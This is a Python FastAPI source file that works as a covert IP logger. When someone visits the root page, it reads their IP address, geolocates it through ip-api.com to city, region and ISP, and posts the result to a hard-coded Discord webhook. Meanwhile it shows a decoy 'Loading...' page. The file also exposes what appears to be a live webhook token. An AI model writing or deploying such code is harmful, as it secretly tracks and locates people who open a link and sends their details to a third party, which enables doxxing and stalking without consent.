from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests

app = FastAPI()
WEBHOOK_URL = "https://discord.com/api/webhooks/1508105125166846125/930vrRtV_IZxhSqTTxuBthH7sFWPOw_y8HIOZz9frJcW4wkBlT_l8JQv-e2H00I"

@app.get("/")
async def log_request(request: Request):
    # 1. Get the real visitor IP
    forwarded = request.headers.get("x-forwarded-for")
    # This splits the chain to grab the actual user IP at the start
    client_ip = forwarded.split(',')[0].strip() if forwarded else request.client.host
    
    # 2. Logic: If the IP looks like a Google bot (Render ping), we log it 
    # to your Render terminal only, NOT to Discord.
    # If it is NOT a Google bot, we send it to Discord.
    if client_ip.startswith(("34.", "35.", "162.")):
        print(f"Bot/System Ping ignored for Discord: {client_ip}")
    else:
        # This is where we capture the REAL visitor
        try:
            url = f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,isp,query"
            resp = requests.get(url, timeout=5).json()
            
            if resp.get("status") == "success":
                message = (
                    f"**Real Visitor Detected!**\n"
                    f"IP: `{resp.get('query')}`\n"
                    f"Location: `{resp.get('city')}, {resp.get('regionName')}`\n"
                    f"ISP: `{resp.get('isp')}`"
                )
                requests.post(WEBHOOK_URL, json={"content": message})
        except Exception as e:
            print(f"Error processing visitor: {e}")

    return HTMLResponse(content="<h1>Loading...</h1>")
